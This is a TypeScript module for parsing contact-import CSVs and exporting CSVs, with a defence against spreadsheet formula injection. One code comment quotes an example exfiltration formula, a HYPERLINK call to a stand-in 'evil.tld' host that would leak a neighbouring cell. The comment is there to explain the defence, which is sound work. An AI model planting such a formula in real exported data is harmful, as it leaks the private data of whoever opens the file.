/**
 * Minimal RFC-4180 CSV reader for contact imports (LinkedIn exports, spreadsheets).
 * Handles quoted fields, embedded commas/newlines, doubled quotes, and both
 * comma- and semicolon-separated files — Excel in a Belgian locale writes the latter.
 */

export function detectDelimiter(sample: string): "," | ";" {
  const firstLine = sample.split(/\r?\n/, 1)[0] ?? "";
  let commas = 0;
  let semis = 0;
  let inQuotes = false;
  for (const ch of firstLine) {
    if (ch === '"') inQuotes = !inQuotes;
    else if (!inQuotes && ch === ",") commas++;
    else if (!inQuotes && ch === ";") semis++;
  }
  return semis > commas ? ";" : ",";
}

export function parseCsv(text: string, delimiter?: "," | ";"): string[][] {
  const clean = text.replace(/^﻿/, ""); // strip Excel's byte-order mark
  const delim = delimiter ?? detectDelimiter(clean);
  const rows: string[][] = [];
  let row: string[] = [];
  let field = "";
  let inQuotes = false;

  for (let i = 0; i < clean.length; i++) {
    const ch = clean[i]!;
    if (inQuotes) {
      if (ch === '"') {
        if (clean[i + 1] === '"') {
          field += '"';
          i++;
        } else {
          inQuotes = false;
        }
      } else {
        field += ch;
      }
      continue;
    }
    if (ch === '"') {
      inQuotes = true;
    } else if (ch === delim) {
      row.push(field);
      field = "";
    } else if (ch === "\n") {
      row.push(field);
      rows.push(row);
      row = [];
      field = "";
    } else if (ch !== "\r") {
      field += ch;
    }
  }
  if (field.length || row.length) {
    row.push(field);
    rows.push(row);
  }
  return rows.filter((r) => r.some((cell) => cell.trim() !== ""));
}

/** Header aliases seen in LinkedIn exports and hand-made spreadsheets. */
const HEADER_ALIASES: Record<string, string[]> = {
  email: ["email", "email address", "e-mail", "emailaddress", "mail", "e-mailadres"],
  first_name: ["first name", "firstname", "first", "voornaam", "prénom", "prenom"],
  last_name: ["last name", "lastname", "last", "surname", "achternaam", "nom"],
  phone: ["phone", "phone number", "mobile", "telefoon", "gsm", "téléphone"],
  linkedin_url: ["linkedin", "linkedin url", "profile url", "url", "public profile url"],
  source_note: ["note", "notes", "source", "company", "position", "headline"],
};

export function normaliseHeader(raw: string): string | null {
  const key = raw.trim().toLowerCase();
  for (const [field, aliases] of Object.entries(HEADER_ALIASES)) {
    if (aliases.includes(key)) return field;
  }
  return null;
}

export interface ImportRow {
  /** Absent for LinkedIn-only rows — one of email / linkedin_key is always set. */
  email?: string;
  first_name: string;
  last_name: string;
  phone?: string;
  linkedin_url?: string;
  /** Normalised profile key when linkedin_url parses — the dedup identity. */
  linkedin_key?: string;
  source_note?: string;
}

export interface ImportParseResult {
  rows: ImportRow[];
  skipped: { line: number; reason: string }[];
  /** Rows that were imported, but with something worth telling the user. */
  warnings: { line: number; note: string }[];
  /** Header columns we could not map — surfaced so the user can fix the file. */
  unmappedHeaders: string[];
}

const EMAIL_RE = /^[^\s@]+@[^\s@]+\.[a-z]{2,}$/i;

export function isValidEmail(value: string): boolean {
  return EMAIL_RE.test(value.trim());
}

/**
 * Map a parsed CSV onto import rows.
 *
 * A row earns its place with a valid email OR a recognisable LinkedIn profile —
 * half of a real prospect list has no address. Anything with neither is skipped
 * with a reason rather than silently dropped, and a row whose email is mangled
 * but whose LinkedIn parses is imported LinkedIn-only with a warning, because
 * losing the typo is better than losing the person.
 */
export function mapImportRows(
  table: string[][],
  keyOf: (url: string) => string | null = () => null,
): ImportParseResult {
  const skipped: { line: number; reason: string }[] = [];
  const warnings: { line: number; note: string }[] = [];
  if (!table.length) return { rows: [], skipped, warnings, unmappedHeaders: [] };

  const header = table[0]!;
  const mapping = header.map(normaliseHeader);
  const unmappedHeaders = header.filter((h, i) => h.trim() !== "" && mapping[i] === null);
  if (!mapping.includes("email") && !mapping.includes("linkedin_url")) {
    return {
      rows: [],
      skipped: [
        {
          line: 1,
          reason: "No email or LinkedIn column found — add a column headed 'Email' or 'LinkedIn'.",
        },
      ],
      warnings,
      unmappedHeaders,
    };
  }

  const seen = new Set<string>();
  const rows: ImportRow[] = [];
  for (let r = 1; r < table.length; r++) {
    const cells = table[r]!;
    const rec: Record<string, string> = {};
    mapping.forEach((field, i) => {
      if (field) rec[field] = (cells[i] ?? "").trim();
    });

    const rawEmail = (rec.email ?? "").toLowerCase();
    const email = isValidEmail(rawEmail) ? rawEmail : undefined;
    const linkedinUrl = rec.linkedin_url || undefined;
    const linkedinKey = linkedinUrl ? (keyOf(linkedinUrl) ?? undefined) : undefined;

    if (!email && !linkedinKey) {
      skipped.push({
        line: r + 1,
        reason: rawEmail
          ? `Not a valid email address (${rawEmail}) and no usable LinkedIn URL`
          : "No email address and no usable LinkedIn URL",
      });
      continue;
    }
    if (rawEmail && !email) {
      warnings.push({
        line: r + 1,
        note: `Email looked invalid (${rawEmail}) — imported with LinkedIn only`,
      });
    }
    if (linkedinUrl && !linkedinKey) {
      warnings.push({
        line: r + 1,
        note: `Could not read the LinkedIn URL (${linkedinUrl.slice(0, 60)}) — kept the email only`,
      });
    }

    // One person, one row: dedup on every identity the row carries, so the same
    // freelancer listed once by email and once by profile does not import twice.
    const identities = [email, linkedinKey && `li:${linkedinKey}`].filter((v): v is string =>
      Boolean(v),
    );
    if (identities.some((k) => seen.has(k))) {
      skipped.push({
        line: r + 1,
        reason: `Duplicate of an earlier row: ${email ?? linkedinUrl}`,
      });
      continue;
    }
    for (const k of identities) seen.add(k);

    rows.push({
      email,
      first_name: rec.first_name ?? "",
      last_name: rec.last_name ?? "",
      phone: rec.phone || undefined,
      linkedin_url: linkedinUrl,
      linkedin_key: linkedinKey,
      source_note: rec.source_note || undefined,
    });
  }
  return { rows, skipped, warnings, unmappedHeaders };
}

/**
 * Quote a value for CSV export, and defuse spreadsheet formulas.
 *
 * Names, headlines and skills come from the public registration form and end up
 * in a file a recruiter opens in Excel. A value starting with `=`, `+`, `-` or
 * `@` is treated as a formula there, so a registrant could put
 * `=HYPERLINK("https://evil.tld?d="&B2, "CV")` in their headline and have the
 * recruiter's own spreadsheet leak the neighbouring cell. Prefixing an
 * apostrophe makes the cell literal text; Excel does not display it.
 */
export function csvCell(value: unknown): string {
  const raw = value === null || value === undefined ? "" : String(value);
  const s = /^[=+\-@\t\r]/.test(raw) ? `'${raw}` : raw;
  // A tab is quoted along with the usual suspects: the file is comma-delimited,
  // but Excel's import dialog can be pointed at tabs, and an unquoted tab would
  // then split one freelancer's row into two.
  return /[",;\n\r\t]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
}

export function toCsv(headers: string[], rows: unknown[][]): string {
  const lines = [headers.map(csvCell).join(",")];
  for (const row of rows) lines.push(row.map(csvCell).join(","));
  return lines.join("\r\n");
}
